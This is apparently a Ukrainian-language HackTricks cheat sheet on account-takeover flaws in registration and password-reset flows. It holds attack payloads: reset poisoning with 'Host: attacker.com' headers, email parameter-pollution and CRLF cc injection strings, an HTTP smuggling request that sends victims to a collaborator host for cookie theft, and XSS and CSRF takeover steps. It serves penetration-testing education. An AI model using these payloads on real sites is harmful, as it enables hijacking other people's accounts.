# –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Ç–∞ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}


## –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó

### –î—É–±–ª—é–≤–∞–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó

* –°–ø—Ä–æ–±—É–π—Ç–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ—Å–Ω—É—é—á–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, –≤–∞—Ä—ñ—é—é—á–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É:
* –≤–µ–ª–∏–∫—ñ –ª—ñ—Ç–µ—Ä–∏
* \+1@
* –¥–æ–¥–∞–π—Ç–µ –∫—Ä–∞–ø–∫—É –≤ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ–π –ø–æ—à—Ç—ñ
* —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏ –≤ —ñ–º–µ–Ω—ñ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ (%00, %09, %20)
* –î–æ–¥–∞–π—Ç–µ —á–æ—Ä–Ω—ñ —Å–∏–º–≤–æ–ª–∏ –ø—ñ—Å–ª—è –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑'—è—Å—É–≤–∞—Ç–∏, –∫–æ–ª–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–∂–µ –±—É–ª–æ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ –≤ –¥–æ–¥–∞—Ç–∫—É.

### –ü–æ–ª—ñ—Ç–∏–∫–∞ –ø–∞—Ä–æ–ª—ñ–≤

–°—Ç–≤–æ—Ä—é—é—á–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–ª—ñ—Ç–∏–∫—É –ø–∞—Ä–æ–ª—ñ–≤ (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–ª–∞–±–∫—ñ –ø–∞—Ä–æ–ª—ñ).\
–£ —Ç–∞–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.

### SQL-—ñ–Ω'—î–∫—Ü—ñ—è

[**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É** ](sql-injection/#insert-statement), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∞–±–æ –≤–∏—Ç—è–≥—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —á–µ—Ä–µ–∑ **SQL-—ñ–Ω'—î–∫—Ü—ñ—ó** —É —Ñ–æ—Ä–º–∞—Ö —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó.

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### –ó–º—ñ–Ω–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏

–ü—ñ—Å–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —Ü—è –∑–º—ñ–Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∞–±–æ —á–∏ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ —ó—ó –Ω–∞ –¥–æ–≤—ñ–ª—å–Ω—ñ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏.

### –ë—ñ–ª—å—à–µ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ç–∏–º—á–∞—Å–æ–≤—ñ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏**
* **–î–æ–≤–≥–∏–π** **–ø–∞—Ä–æ–ª—å** (>200) –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **DoS**
* **–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ–±–º–µ–∂–µ–Ω–Ω—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ username@**burp\_collab**.net —ñ –∞–Ω–∞–ª—ñ–∑—É–π—Ç–µ **callback**

## **–ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è**

### –í–∏—Ç—ñ–∫ —Ç–æ–∫–µ–Ω–∞ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è —á–µ—Ä–µ–∑ —Ä–µ—Ñ–µ—Ä–µ—Ä <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. –ó–∞–ø—Ä–æ—Å—ñ—Ç—å —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –Ω–∞ –≤–∞—à—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É
2. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è
3. –ù–µ –∑–º—ñ–Ω—é–π—Ç–µ –ø–∞—Ä–æ–ª—å
4. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞ –±—É–¥—å-—è–∫—ñ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ –≤–µ–±-—Å–∞–π—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: Facebook, Twitter)
5. –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å –∑–∞–ø–∏—Ç —É –ø—Ä–æ–∫—Å—ñ Burp Suite
6. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ referer –≤–∏—Ç—ñ–∫–∞—î —Ç–æ–∫–µ–Ω —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è.

### –û—Ç—Ä—É—î–Ω–Ω—è —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å –∑–∞–ø–∏—Ç –Ω–∞ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –≤ Burp Suite
2. –î–æ–¥–∞–π—Ç–µ –∞–±–æ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤ Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. –ü–µ—Ä–µ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç –∑ –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. –®—É–∫–∞–π—Ç–µ URL —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ _–∑–∞–≥–æ–ª–æ–≤–∫–∞ host_, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: `https://attacker.com/reset-password.php?token=TOKEN`

### –°–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR –Ω–∞ API –ü–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. –ê—Ç–∞–∫—É—é—á–∏–π –ø–æ–≤–∏–Ω–µ–Ω —É–≤—ñ–π—Ç–∏ –≤ —Å–≤—ñ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó **–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å**.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å Burp Suite —ñ –ø–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å –∑–∞–ø–∏—Ç.
3. –í—ñ–¥–ø—Ä–∞–≤—Ç–µ –π–æ–≥–æ –Ω–∞ –≤–∫–ª–∞–¥–∫—É –ø–æ–≤—Ç–æ—Ä—é–≤–∞—á–∞ —Ç–∞ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏: ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### –°–ª–∞–±–∫–∏–π –¢–æ–∫–µ–Ω –°–∫–∏–¥–∞–Ω–Ω—è –ü–∞—Ä–æ–ª—è <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

–¢–æ–∫–µ–Ω —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –ø–æ–≤–∏–Ω–µ–Ω –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏—Å—è –≤–∏–ø–∞–¥–∫–æ–≤–∏–º —á–∏–Ω–æ–º —ñ –±—É—Ç–∏ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–º —â–æ—Ä–∞–∑—É.\
–°–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ —Ç–æ–∫–µ–Ω –º–∞—î —Ç–µ—Ä–º—ñ–Ω –¥—ñ—ó –∞–±–æ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–π, –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∞–ª–≥–æ—Ä–∏—Ç–º –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —î —Å–ª–∞–±–∫–∏–º —ñ –º–æ–∂–µ –±—É—Ç–∏ –≤–≥–∞–¥–∞–Ω–∏–π. –ù–∞—Å—Ç—É–ø–Ω—ñ –∑–º—ñ–Ω–Ω—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º.

* –ß–∞—Å–æ–≤–∞ –º—ñ—Ç–∫–∞
* ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
* –ï–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
* –Ü–º'—è —Ç–∞ –ø—Ä—ñ–∑–≤–∏—â–µ
* –î–∞—Ç–∞ –Ω–∞—Ä–æ–¥–∂–µ–Ω–Ω—è
* –ö—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—è
* –¢—ñ–ª—å–∫–∏ —á–∏—Å–ª–∞
* –ù–µ–≤–µ–ª–∏–∫–∞ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å —Ç–æ–∫–µ–Ω—ñ–≤ (—Å–∏–º–≤–æ–ª–∏ –º—ñ–∂ \[A-Z,a-z,0-9])
* –ü–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω–∞
* –î–∞—Ç–∞ –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó —Ç–æ–∫–µ–Ω–∞

### –í–∏—Ç—ñ–∫ –¢–æ–∫–µ–Ω–∞ –°–∫–∏–¥–∞–Ω–Ω—è –ü–∞—Ä–æ–ª—è <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. –í–∏–∫–ª–∏—á—Ç–µ –∑–∞–ø–∏—Ç –Ω–∞ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ API/UI –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: test@mail.com
2. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å `resetToken`
3. –ü–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ç–æ–∫–µ–Ω –≤ URL, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### –°–∫–∏–¥–∞–Ω–Ω—è –ü–∞—Ä–æ–ª—è –ß–µ—Ä–µ–∑ –ö–æ–ª—ñ–∑—ñ—é –Ü–º–µ–Ω—ñ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. –ó–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—è –≤ —Å–∏—Å—Ç–µ–º—ñ –∑ —ñ–º–µ–Ω–µ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–º —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∂–µ—Ä—Ç–≤–∏, –∞–ª–µ –∑ –ø—Ä–æ–±—ñ–ª–∞–º–∏ –ø–µ—Ä–µ–¥ —ñ/–∞–±–æ –ø—ñ—Å–ª—è —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: `"admin "`
2. –ó–∞–ø—Ä–æ—Å—ñ—Ç—å —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –∑ –≤–∞—à–∏–º —à–∫—ñ–¥–ª–∏–≤–∏–º —ñ–º–µ–Ω–µ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
3. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ç–æ–∫–µ–Ω, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π –Ω–∞ –≤–∞—à—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É, —ñ —Å–∫–∏–Ω—å—Ç–µ –ø–∞—Ä–æ–ª—å –∂–µ—Ä—Ç–≤–∏.
4. –£–≤—ñ–π–¥—ñ—Ç—å –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∂–µ—Ä—Ç–≤–∏ –∑ –Ω–æ–≤–∏–º –ø–∞—Ä–æ–ª–µ–º.

–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ CTFd –±—É–ª–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏.\
–î–∏–≤—ñ—Ç—å—Å—è: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –û–±–ª—ñ–∫–æ–≤–æ–≥–æ –ó–∞–ø–∏—Å—É –ß–µ—Ä–µ–∑ –ú—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π –°–∫—Ä–∏–ø—Ç–∏–Ω–≥ <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. –ó–Ω–∞–π–¥—ñ—Ç—å XSS –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –∞–±–æ –ø—ñ–¥–¥–æ–º–µ–Ω—É, —è–∫—â–æ –∫—É–∫–∏ –æ–±–º–µ–∂–µ–Ω—ñ –¥–æ –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–æ–≥–æ –¥–æ–º–µ–Ω—É: `*.domain.com`
2. –í–∏—Ç—ñ–∫–∞–π—Ç–µ –ø–æ—Ç–æ—á–Ω–∏–π **cookie —Å–µ—Å—ñ—ó**
3. –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–π—Ç–µ—Å—è —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ cookie

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –û–±–ª—ñ–∫–æ–≤–æ–≥–æ –ó–∞–ø–∏—Å—É –ß–µ—Ä–µ–∑ –ü—ñ–¥—Ç–∞—Å—É–≤–∞–Ω–Ω—è HTTP –ó–∞–ø–∏—Ç—ñ–≤ <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **smuggler** –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∏–ø—É –ø—ñ–¥—Ç–∞—Å—É–≤–∞–Ω–Ω—è HTTP –∑–∞–ø–∏—Ç—ñ–≤ (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. –°—Ñ–æ—Ä–º—É–π—Ç–µ –∑–∞–ø–∏—Ç, —è–∫–∏–π –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ `POST / HTTP/1.1` –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` –∑ –º–µ—Ç–æ—é –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∂–µ—Ä—Ç–≤ –Ω–∞ burpcollab —ñ –∫—Ä–∞–¥—ñ–∂–∫–∏ —ó—Ö–Ω—ñ—Ö cookie\
3\. –û—Å—Ç–∞—Ç–æ—á–Ω–∏–π –∑–∞–ø–∏—Ç –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —á–µ—Ä–µ–∑ CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. –°—Ç–≤–æ—Ä—ñ—Ç—å payload –¥–ª—è CSRF, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: ‚ÄúHTML —Ñ–æ—Ä–º–∞ –∑ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ—é –≤—ñ–¥–ø—Ä–∞–≤–∫–æ—é –¥–ª—è –∑–º—ñ–Ω–∏ –ø–∞—Ä–æ–ª—è‚Äù
2. –í—ñ–¥–ø—Ä–∞–≤—Ç–µ payload

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —á–µ—Ä–µ–∑ JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

* –ó–º—ñ–Ω—ñ—Ç—å JWT –Ω–∞ —ñ–Ω—à–∏–π User ID / Email
* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞ —Å–ª–∞–±–∫–∏–π –ø—ñ–¥–ø–∏—Å JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
